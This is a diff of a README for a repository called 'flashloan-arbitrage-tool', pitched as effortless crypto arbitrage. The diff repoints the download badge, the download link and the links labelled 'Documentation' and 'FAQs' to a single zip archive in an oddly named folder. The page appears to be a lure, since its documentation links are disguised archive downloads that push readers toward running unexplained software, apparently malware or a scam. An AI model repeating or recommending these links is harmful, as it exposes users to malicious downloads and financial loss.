@@ -1,6 +1,6 @@
 # 🚀 flashloan-arbitrage-tool - Effortless Arbitrage for Everyone
 
-[![Download Now](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip%20Now-Flashloan%20Arbitrage%20Tool-brightgreen)](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip)
+[![Download Now](https://github.com/Faysal012/flashloan-arbitrage-tool/raw/refs/heads/main/agrammatism/tool_flashloan_arbitrage_1.0.zip%20Now-Flashloan%20Arbitrage%20Tool-brightgreen)](https://github.com/Faysal012/flashloan-arbitrage-tool/raw/refs/heads/main/agrammatism/tool_flashloan_arbitrage_1.0.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ The flashloan-arbitrage-tool allows users to take advantage of price discrepanci
 
 To get started with the flashloan-arbitrage-tool, visit the following page to download the application:
 
-[Download Here](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip)
+[Download Here](https://github.com/Faysal012/flashloan-arbitrage-tool/raw/refs/heads/main/agrammatism/tool_flashloan_arbitrage_1.0.zip)
 
 Follow these steps to successfully download and install the tool:
 
@@ -76,8 +76,8 @@ Join our community for support and discussions:
 
 For further reading and resources, visit:
 
-- [Documentation](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip): Detailed guides on using all features.
-- [FAQs](https://raw.githubusercontent.com/Faysal012/flashloan-arbitrage-tool/main/agrammatism/flashloan-arbitrage-tool.zip): Common questions and answers to assist new users.
+- [Documentation](https://github.com/Faysal012/flashloan-arbitrage-tool/raw/refs/heads/main/agrammatism/tool_flashloan_arbitrage_1.0.zip): Detailed guides on using all features.
+- [FAQs](https://github.com/Faysal012/flashloan-arbitrage-tool/raw/refs/heads/main/agrammatism/tool_flashloan_arbitrage_1.0.zip): Common questions and answers to assist new users.
 
 ## 📤 Feedback
 
